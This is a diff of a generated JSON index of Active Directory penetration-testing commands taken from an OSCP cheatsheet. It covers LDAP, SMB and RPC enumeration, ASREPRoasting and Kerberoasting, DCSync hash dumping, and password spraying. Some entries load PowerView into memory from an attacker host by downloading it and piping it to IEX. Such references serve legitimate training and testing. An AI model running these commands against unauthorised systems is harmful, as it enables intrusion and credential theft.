@@ -1,46 +1,8 @@
 {
   "version": 1,
-  "generated_at": "2026-04-29T18:03:07.325Z",
+  "generated_at": "2026-04-30T11:06:55.458Z",
   "source_root": "../oscp-cheatsheet",
   "commands": [
-    {
-      "id": "note-active-directory-enumeration-smb-enum-md-4",
-      "title": "Access SYSVOL.",
-      "description": "",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "SMB",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "SMB",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy"
-      ],
-      "next": [],
-      "command": "smbclient //<DC_IP>/SYSVOL -U \"<DOMAIN>\\\\<USER>%<PASS>\"",
-      "lang": "sh"
-    },
     {
       "id": "note-active-directory-privesc-md-2",
       "title": "ACL Abuse - Add Group Member With Net RPC",
@@ -110,7 +72,7 @@
         "Hash"
       ],
       "next": [],
-      "command": "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\nGet-DomainGroup \"<GROUP>\"\nAdd-DomainGroupMember -Identity \"<GROUP>\" -Members <USER>\nGet-DomainGroupMember \"<GROUP>\"",
+      "command": "# Load PowerView in memory.\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\n\n# Inspect the group, add the controlled user, and verify membership.\nGet-DomainGroup \"<GROUP>\"\nAdd-DomainGroupMember -Identity \"<GROUP>\" -Members <USER>\nGet-DomainGroupMember \"<GROUP>\"",
       "lang": "powershell"
     },
     {
@@ -498,81 +460,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-enumeration-ldap-enum-md-5",
-      "title": "ASREPRoast with NetExec.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "LDAP",
-        "Kerberos",
-        "ActiveDirectory",
-        "Exploitation"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "LDAP",
-        "Kerberos",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Exploitation"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast output.txt",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-ldap-enum-md-6",
-      "title": "ASREPRoast with user list.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Kerberos",
-        "ActiveDirectory",
-        "Exploitation"
-      ],
-      "requires": [
-        "Username"
-      ],
-      "services": [
-        "Kerberos",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Exploitation"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -outputfile output.txt",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-initial-access-md-10",
+      "id": "note-active-directory-initial-access-md-11",
       "title": "Bad-ODF NTLM Capture",
       "description": "Generate a malicious ODF document, upload it to a place the victim opens, capture NetNTLMv2, then crack it.",
       "source": "Active Directory/Initial Access.md",
@@ -645,8 +533,523 @@
       "lang": "sh"
     },
     {
+      "id": "note-active-directory-enumeration-ldap-enum-md-1",
+      "title": "Commands",
+      "description": "Test anonymous LDAP bind.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "LDAP",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [],
+      "services": [
+        "LDAP",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "nxc ldap <DC_IP> -u '' -p ''",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-ldap-enum-md-2",
+      "title": "Commands",
+      "description": "Test authenticated LDAP access.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "LDAP",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "LDAP",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>'",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-ldap-enum-md-3",
+      "title": "Commands",
+      "description": "Enumerate users.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "LDAP",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "LDAP",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-ldap-enum-md-4",
+      "title": "Commands",
+      "description": "Enumerate groups.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "LDAP",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "LDAP",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-ldap-enum-md-5",
+      "title": "Commands",
+      "description": "ASREPRoast with NetExec.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "LDAP",
+        "Kerberos",
+        "ActiveDirectory",
+        "Exploitation"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "LDAP",
+        "Kerberos",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Exploitation"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast output.txt",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-ldap-enum-md-6",
+      "title": "Commands",
+      "description": "ASREPRoast with user list.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Kerberos",
+        "ActiveDirectory",
+        "Exploitation"
+      ],
+      "requires": [
+        "Username"
+      ],
+      "services": [
+        "Kerberos",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Exploitation"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -outputfile output.txt",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-ldap-enum-md-7",
+      "title": "Commands",
+      "description": "Kerberoast with NetExec.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "LDAP",
+        "Kerberos",
+        "ActiveDirectory",
+        "Exploitation"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "LDAP",
+        "Kerberos",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Exploitation"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-ldap-enum-md-8",
+      "title": "Commands",
+      "description": "Kerberoast with Impacket.",
+      "source": "Active Directory/Enumeration/LDAP Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "Kerberos",
+        "ActiveDirectory",
+        "Exploitation"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "Kerberos",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Exploitation"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Users",
+        "Groups",
+        "Hash"
+      ],
+      "next": [],
+      "command": "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -outputfile output.txt",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-1",
+      "title": "Commands",
+      "description": "Test SMB null session.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "SMB",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [],
+      "services": [
+        "SMB",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy",
+        "Domain",
+        "DC",
+        "NamingContext",
+        "Ports"
+      ],
+      "next": [],
+      "command": "nxc smb <DC_IP> -u '' -p ''",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-2",
+      "title": "Commands",
+      "description": "List shares with null session.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "SMB",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [],
+      "services": [
+        "SMB",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy"
+      ],
+      "next": [],
+      "command": "nxc smb <DC_IP> -u '' -p '' --shares",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-3",
+      "title": "Commands",
+      "description": "List shares with credentials.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "SMB",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "SMB",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy"
+      ],
+      "next": [],
+      "command": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --shares",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-4",
+      "title": "Commands",
+      "description": "Access SYSVOL.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "SMB",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "SMB",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy"
+      ],
+      "next": [],
+      "command": "smbclient //<DC_IP>/SYSVOL -U \"<DOMAIN>\\\\<USER>%<PASS>\"",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-5",
+      "title": "Commands",
+      "description": "Enumerate users.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "SMB",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "SMB",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy"
+      ],
+      "next": [],
+      "command": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --users",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-6",
+      "title": "Commands",
+      "description": "Enumerate groups.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "SMB",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "SMB",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy"
+      ],
+      "next": [],
+      "command": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --groups",
+      "lang": "sh"
+    },
+    {
       "id": "note-active-directory-enumeration-smb-enum-md-7",
-      "title": "Check password policy.",
+      "title": "Commands",
       "description": "Check password policy.",
       "source": "Active Directory/Enumeration/SMB Enum.md",
       "source_type": "markdown",
@@ -682,6 +1085,82 @@
       ],
       "next": [],
       "command": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-8",
+      "title": "Commands",
+      "description": "Query a specific user by RID.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "RPC",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "RPC",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy"
+      ],
+      "next": [],
+      "command": "rpcclient -U \"<USER>%<PASS>\" <DC_IP> -c \"queryuser 0x1f4\"",
+      "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-enumeration-smb-enum-md-9",
+      "title": "Commands",
+      "description": "Enumerate local groups.",
+      "source": "Active Directory/Enumeration/SMB Enum.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "RPC",
+        "ActiveDirectory",
+        "Enumeration"
+      ],
+      "requires": [
+        "Username",
+        "Password"
+      ],
+      "services": [
+        "RPC",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "Enumeration"
+      ],
+      "target_types": [
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shares",
+        "Users",
+        "Groups",
+        "PasswordPolicy"
+      ],
+      "next": [],
+      "command": "rpcclient -U \"<USER>%<PASS>\" <DC_IP> -c \"enumalsgroups domain\"",
       "lang": "sh"
     },
     {
@@ -723,7 +1202,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-15",
+      "id": "note-active-directory-lateral-movement-md-16",
       "title": "Credential Dumping After Local Admin",
       "description": "Dump local secrets remotely after confirming local admin access.",
       "source": "Active Directory/Lateral Movement.md",
@@ -830,7 +1309,7 @@
       "lang": "cmd"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-10",
+      "id": "note-active-directory-lateral-movement-md-11",
       "title": "DCOM MMC20 Execution",
       "description": "Use the MMC20 DCOM object for remote command execution when you have the needed privileges.",
       "source": "Active Directory/Lateral Movement.md",
@@ -898,194 +1377,6 @@
       ],
       "next": [],
       "command": "# Impacket: dump all domain hashes.\nimpacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>\n\n# Impacket: dump one user.\nimpacket-secretsdump -just-dc-user <TARGET_USER> <DOMAIN>/<USER>:<PASS>@<DC_IP>\n\n# Mimikatz from a Windows shell.\nmimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>\"\n\n# NetExec with password.\nnxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds\n\n# NetExec with NTLM hash.\nnxc smb <DC_IP> -u <USER> -H <NTLM_HASH> --ntds",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-ldap-enum-md-4",
-      "title": "Enumerate groups.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "LDAP",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "LDAP",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-smb-enum-md-6",
-      "title": "Enumerate groups.",
-      "description": "",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "SMB",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "SMB",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy"
-      ],
-      "next": [],
-      "command": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --groups",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-smb-enum-md-9",
-      "title": "Enumerate local groups.",
-      "description": "",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "RPC",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "RPC",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy"
-      ],
-      "next": [],
-      "command": "rpcclient -U \"<USER>%<PASS>\" <DC_IP> -c \"enumalsgroups domain\"",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-ldap-enum-md-3",
-      "title": "Enumerate users.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "LDAP",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "LDAP",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-smb-enum-md-5",
-      "title": "Enumerate users.",
-      "description": "",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "SMB",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "SMB",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy"
-      ],
-      "next": [],
-      "command": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --users",
       "lang": "sh"
     },
     {
@@ -1166,83 +1457,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-enumeration-ldap-enum-md-8",
-      "title": "Kerberoast with Impacket.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "Kerberos",
-        "ActiveDirectory",
-        "Exploitation"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "Kerberos",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Exploitation"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -outputfile output.txt",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-ldap-enum-md-7",
-      "title": "Kerberoast with NetExec.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "LDAP",
-        "Kerberos",
-        "ActiveDirectory",
-        "Exploitation"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "LDAP",
-        "Kerberos",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Exploitation"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-initial-access-md-3",
+      "id": "note-active-directory-initial-access-md-4",
       "title": "Kerbrute Password Attacks",
       "description": "Use Kerbrute for Kerberos password spray or a single-user brute force after checking lockout risk.",
       "source": "Active Directory/Initial Access.md",
@@ -1429,77 +1644,6 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-enumeration-smb-enum-md-3",
-      "title": "List shares with credentials.",
-      "description": "",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "SMB",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "SMB",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy"
-      ],
-      "next": [],
-      "command": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --shares",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-smb-enum-md-2",
-      "title": "List shares with null session.",
-      "description": "",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "SMB",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [],
-      "services": [
-        "SMB",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy"
-      ],
-      "next": [],
-      "command": "nxc smb <DC_IP> -u '' -p '' --shares",
-      "lang": "sh"
-    },
-    {
       "id": "note-active-directory-post-da-md-2",
       "title": "LSASS Dump With Mimikatz",
       "description": "Dump logon credentials with Mimikatz on DC.",
@@ -1656,7 +1800,7 @@
       "lang": "sql"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-11",
+      "id": "note-active-directory-lateral-movement-md-12",
       "title": "MSSQL xp_cmdshell",
       "description": "Use MSSQL admin access to enable `xp_cmdshell`, run commands, and execute a payload.",
       "source": "Active Directory/Lateral Movement.md",
@@ -1907,7 +2051,7 @@
       "lang": "cmd"
     },
     {
-      "id": "note-active-directory-initial-access-md-9",
+      "id": "note-active-directory-initial-access-md-10",
       "title": "NTLM Relay With SMB Signing Disabled",
       "description": "Relay captured Net-NTLMv2 when SMB signing is disabled.",
       "source": "Active Directory/Initial Access.md",
@@ -1941,7 +2085,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-initial-access-md-4",
+      "id": "note-active-directory-initial-access-md-5",
       "title": "Null Session To SYSVOL",
       "description": "Check anonymous SMB access, browse SYSVOL if allowed, and decrypt old GPP passwords if found.",
       "source": "Active Directory/Initial Access.md",
@@ -1973,7 +2117,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-7",
+      "id": "note-active-directory-lateral-movement-md-8",
       "title": "Overpass The Hash With Mimikatz",
       "description": "Use Mimikatz overpass-the-hash to spawn a Kerberos-capable PowerShell session, then reach another host.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2012,7 +2156,7 @@
       "lang": "powershell"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-5",
+      "id": "note-active-directory-lateral-movement-md-6",
       "title": "Pass The Hash",
       "description": "Test an NTLM hash, then use SMB/WMI execution if the account has admin rights.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2053,7 +2197,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-8",
+      "id": "note-active-directory-lateral-movement-md-9",
       "title": "Pass The Key With Impacket",
       "description": "Get a TGT with an NTLM hash, then use the ticket with Kerberos-aware tools.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2090,7 +2234,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-9",
+      "id": "note-active-directory-lateral-movement-md-10",
       "title": "Pass The Ticket",
       "description": "Export Kerberos tickets with Mimikatz, inject the useful CIFS ticket, and access the target share.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2127,7 +2271,7 @@
       "lang": "powershell"
     },
     {
-      "id": "note-active-directory-initial-access-md-5",
+      "id": "note-active-directory-initial-access-md-6",
       "title": "Password Spray",
       "description": "Check password policy, then spray one password across a user list.",
       "source": "Active Directory/Initial Access.md",
@@ -2162,7 +2306,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-initial-access-md-6",
+      "id": "note-active-directory-initial-access-md-7",
       "title": "Password Spray Across Protocols",
       "description": "Spray one credential across common internal protocols and keep going after the first success.",
       "source": "Active Directory/Initial Access.md",
@@ -2228,46 +2372,8 @@
         "Paths"
       ],
       "next": [],
-      "command": "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\n\nGet-DomainController\nGet-DomainController | Select-Object Name\nFind-LocalAdminAccess\nGet-DomainGroup -Name \"Domain Admins\"\nGet-DomainUser\nGet-DomainGroup\nGet-DomainComputer | Select-Object dnshostname,operatingsystem\nGet-DomainGroupMember -Identity \"Domain Admins\"\nGet-DomainUser | Where-Object {$_.description} | Select-Object samaccountname,description\nFind-DomainShare -CheckShareAccess\nGet-DomainGPO\nGet-DomainTrust\nGet-DomainUser -SPN\nGet-DomainUser -PreauthNotRequired",
